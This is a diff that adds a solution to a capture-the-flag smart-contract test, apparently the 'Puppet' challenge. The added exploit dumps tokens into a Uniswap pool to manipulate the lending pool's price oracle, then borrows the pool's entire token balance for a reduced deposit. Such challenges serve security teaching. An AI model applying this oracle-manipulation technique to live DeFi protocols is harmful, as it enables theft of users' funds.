@@ -103,6 +103,26 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // Approve token to be swapped
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        // Check initial deposit needed
+        const initialDeposit = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("INITIAL DEPOSIT", ethers.utils.formatEther(initialDeposit));
+
+        // Swap token to exploit oracle vulnerability
+        const deadline = (await ethers.provider.getBlock("latest")).timestamp * 2;
+        await this.uniswapExchange
+        .connect(attacker)
+        .tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), 1, deadline);
+
+        // Get new deposit needed
+        const deposit = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("DEPOSIT", ethers.utils.formatEther(deposit));
+
+
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE,  { value: deposit });
     });
 
     after(async function () {
